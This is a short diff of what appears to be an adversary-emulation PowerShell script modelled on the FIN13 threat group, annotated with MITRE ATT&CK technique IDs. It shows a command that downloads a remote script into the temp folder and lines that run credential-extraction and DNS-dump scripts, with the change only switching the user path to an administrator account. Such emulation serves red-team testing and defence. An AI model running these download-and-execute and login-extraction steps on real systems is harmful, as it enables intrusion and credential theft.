@@ -29,8 +29,8 @@ net localgroup;
 (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/scythe-io/community-threats/master/FIN13/VFS/DNSDump.ps1") | Out-File "$env:TEMP\DNSDump.ps1";
 
 #T1033, T1059.001
-C:\Users\STUDEN~1\AppData\Local\Temp\ExtractLogins.ps1;
+C:\Users\ADMINI~1\AppData\Local\Temp\ExtractLogins.ps1;
 
 #T1564.013, T1018
-C:\Users\STUDEN~1\AppData\Local\Temp\DNSDump.ps1;
+C:\Users\ADMINI~1\AppData\Local\Temp\DNSDump.ps1;
 
